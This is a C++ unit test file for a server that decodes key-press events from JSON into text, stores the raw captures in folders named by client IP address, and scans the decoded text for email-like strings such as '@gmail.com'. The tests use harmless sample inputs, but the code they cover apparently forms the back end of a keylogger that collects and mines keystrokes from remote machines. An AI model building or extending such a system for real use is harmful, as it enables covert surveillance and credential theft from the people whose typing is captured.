#include <gtest/gtest.h>
#include <fstream>
#include <sstream>
#include <string>

#include <stdlib.h>
#include <unistd.h>

extern "C" {
#include "key_decoder.h"
#include "storage.h"
#include "analysis.h"
}

namespace {

std::string MakeTempBase() {
    char tmpl[] = "/tmp/json_serverXXXXXX";
    char *path = mkdtemp(tmpl);
    if (!path) {
        return "";
    }
    return std::string(path);
}

std::string ReadFile(const std::string &path) {
    std::ifstream in(path);
    std::stringstream ss;
    ss << in.rdbuf();
    return ss.str();
}

} // namespace

TEST(KeyDecoder, ExtractsSimpleText) {
    const char *json =
        "{ \"events\": ["
        "{\"key\":\"H\"},{\"key\":\"E\"},{\"key\":\"L\"},{\"key\":\"L\"},{\"key\":\"O\"},"
        "{\"key\":\"SPACE\"},"
        "{\"key\":\"W\"},{\"key\":\"O\"},{\"key\":\"R\"},{\"key\":\"L\"},{\"key\":\"D\"}"
        "] }";

    char out[128];
    extract_text_from_json(json, out, sizeof(out));
    EXPECT_STREQ("HELLO WORLD", out);
}

TEST(KeyDecoder, HandlesSpecialKeys) {
    const char *json =
        "{ \"events\": ["
        "{\"key\":\"A\"},{\"key\":\"SPACE\"},{\"key\":\"ENTER\"},"
        "{\"key\":\"B\"},{\"key\":\"BACKSPACE\"},"
        "{\"key\":\"C\"},{\"key\":\"SHIFT\"},{\"key\":\"D\"}"
        "] }";

    char out[128];
    extract_text_from_json(json, out, sizeof(out));
    EXPECT_STREQ("A \nCD", out);
}

TEST(KeyDecoder, EmptyJsonYieldsEmptyString) {
    const char *json = "{}";
    char out[16];
    extract_text_from_json(json, out, sizeof(out));
    EXPECT_STREQ("", out);
}

TEST(Storage, NextIndexAndSave) {
    std::string base = MakeTempBase();
    ASSERT_FALSE(base.empty());

    ASSERT_EQ(0, storage_init_base(base.c_str()));
    ASSERT_EQ(0, storage_ensure_client_dirs("127.0.0.1"));

    EXPECT_EQ(1, storage_get_next_index("127.0.0.1"));
    ASSERT_EQ(0, storage_save_raw("127.0.0.1", 1, "{}", 2));
    EXPECT_EQ(2, storage_get_next_index("127.0.0.1"));

    std::string path = base + "/127.0.0.1/raw/0001.json";
    std::ifstream f(path);
    EXPECT_TRUE(f.good());
}

TEST(Analysis, WritesSnippetWithMatchCount) {
    std::string base = MakeTempBase();
    ASSERT_FALSE(base.empty());

    ASSERT_EQ(0, storage_init_base(base.c_str()));
    ASSERT_EQ(0, storage_ensure_client_dirs("10.0.0.5"));

    analyze_text_and_store("10.0.0.5", 1, "hello @gmail.com test");

    std::string path = base + "/10.0.0.5/analysis/0001_result.json";
    std::string content = ReadFile(path);

    EXPECT_NE(std::string::npos, content.find("@gmail.com"));
    EXPECT_NE(std::string::npos, content.find("\"total_matches\": 1"));
}
